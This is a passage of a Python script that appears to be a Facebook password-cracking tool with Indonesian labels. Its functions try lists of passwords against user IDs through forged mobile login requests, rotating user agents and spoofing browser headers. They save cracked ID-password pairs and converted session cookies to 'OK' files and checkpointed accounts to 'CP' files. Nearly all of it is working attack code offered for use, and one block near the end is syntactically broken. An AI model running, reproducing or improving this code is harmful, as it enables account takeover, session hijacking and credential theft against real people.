				print(f"\r{A}[{H}OK{A}] {H}{idf} | {pw} {M}~ {B}{tahun(idf)}{N}")
				print(f"\r{H}{kuki}{N}")
				open('OK/'+okh,'a').write(f'{idf}|{pw}|{kuki}')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

###----------[ METODE ]----------###
resok = []
rescp = []
def metod1(idf,pwv,awal):
	global loop,ok,cp
	ahir = str(datetime.datetime.now()-awal).split('.')[0]
	prog.update(des,description=f"\r[bold cyan]{ahir} [bold purple][ [bold green]{ok}{mer}/[bold yellow]{cp} [purple]] [bold white]{loop}[bold red]/[bold white]{len(id)} ")
	prog.advance(des)
	ses = requests.Session()
	for pw in pwv:
		try:
			ua = random.choice(ugen1)
			scupv = ['"8.0.0"','"9.0.0"','"10.0.0"','"11.0.0"','"12.0.0"','"13.0.0"']
			bahasa = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
			link = ses.get(f"https://m.facebook.com/login.php?skip_api_login=1&api_key=3618539641590455&kid_directed_site=0&app_id=3618539641590455&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D3618539641590455%26cbt%3D1696752891275%26e2e%3D%257B%2522init%2522%253A1696752891275%257D%26ies%3D1%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D26963441-e2bf-496f-97bf-2c6623861aed%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.netease.partyglobal%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DbZrS8Qf4YJl6Zmup0AMuKIP1g36luEnC6kIkQ3lDhqo%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De971aba2-6f14-44d0-98d3-44be37e9c6c8%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.netease.partyglobal%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			data = {
				"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"uid": idf,
				"next": "https://m.facebook.com/v13.0/dialog/oauth?cct_prefetching=0&client_id=3618539641590455&cbt=1696752891275&e2e=%7B%22init%22%3A1696752891275%7D&ies=1&sdk=android-13.1.0&sso=chrome_custom_tab&nonce=26963441-e2bf-496f-97bf-2c6623861aed&scope=openid%2Cpublic_profile%2Cemail&state=%7B%220_auth_logger_id%22%3A%22e971aba2-6f14-44d0-98d3-44be37e9c6c8%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22plim8mlau0dci6b51tc1%22%7D&code_challenge_method=S256&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.netease.partyglobal&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&code_challenge=bZrS8Qf4YJl6Zmup0AMuKIP1g36luEnC6kIkQ3lDhqo&ret=login&fbapp_pres=0&logger_id=e971aba2-6f14-44d0-98d3-44be37e9c6c8&tp=unspecified",
				"flow": "login_no_pin",
				"encpass": f"#PWD_BROWSER:0:{str(TimeTegar()).split('.')[0]}:{pw}",
			}
			hider = {
				"Host": "mobile.facebook.com",
				"content-length": f"{len(str(data))}",
				"cache-control": "max-age=0",
				"viewport-width": "501",
				"sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="116", "Google Chrome";v="116"',
				"sec-ch-ua-mobile": "?1",
				"sec-ch-ua-platform": '"Android"',
				"sec-ch-ua-platform-version": "11.0.0",
				"sec-ch-ua-full-version-list": '"Not.A/Brand";v="8.0.0.0", "Chromium";v="116.0.5845.58", "Google Chrome";v="116.0.5845.58"',
				"sec-ch-prefers-color-scheme": "light",
				"upgrade-insecure-requests": "1",
				"origin": "https://mobile.facebook.com",
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1",
				"sec-fetch-dest": "document",
				"referer": f"https://mobile.facebook.com/login.php?skip_api_login=1&api_key=3618539641590455&kid_directed_site=0&app_id=3618539641590455&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D3618539641590455%26cbt%3D1696752891275%26e2e%3D%257B%2522init%2522%253A1696752891275%257D%26ies%3D1%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D26963441-e2bf-496f-97bf-2c6623861aed%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.netease.partyglobal%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DbZrS8Qf4YJl6Zmup0AMuKIP1g36luEnC6kIkQ3lDhqo%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De971aba2-6f14-44d0-98d3-44be37e9c6c8%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.netease.partyglobal%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522e971aba2-6f14-44d0-98d3-44be37e9c6c8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522plim8mlau0dci6b51tc1%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": bahasa
			}
			po = ses.post("https://mobile.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=hider,allow_redirects=False)
			response=parser(po.text, "html.parser")
			if "checkpoint" in po.cookies.get_dict():
				cp+=1
				open('CP/'+cph,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"\r{K}{idf} | {pw}{N}")
				tree.add(f"\r{P}Tahun : {B}{tahun(idf)}{N}")
				tree.add(f"\r{M}{ua}")
				prints(tree)
				break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				ok+=1
				open('OK/'+okh,'a').write(f'{idf}|{pw}\n') 
				tree = Tree("                                 ")
				tree.add(f"\r{H}{idf} | {pw}{N}")
				tree.add(f"\r{P}Tahun : {B}{tahun(idf)}{N}")
				tree.add(f"\r{H}{kuki}")
				prints(tree)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1

def ceker(idf,pw):
	sess=requests.Session()
	data={}
	data2={}
	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://m.facebook.com/","user-agent":"ua"})
	soup=parse(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	response=parse(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
	try:
		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
		responses=parse(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
		cek=[cek.text for cek in responses.find_all("option")]
		if len(cek)==0:pass
		else:
			for opsi in range(len(cek)):ops.append(print(f" {xxx}{cek[opsi]}"))
	except:pass
	if len(ops)==0:pass
	print (' [+] Columns(ops)')
		
				
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))

###----------#[ CREAT FILE ]#----------###
#def memulai():
	try:os.mkdir('/sdcard/AKUN-OK')
	except:pass
	try:os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:os.mkdir('A2F')
	except:pass
	#login_baz()
if __name__=='__main__':
	#try:os.system('git pull')
	login()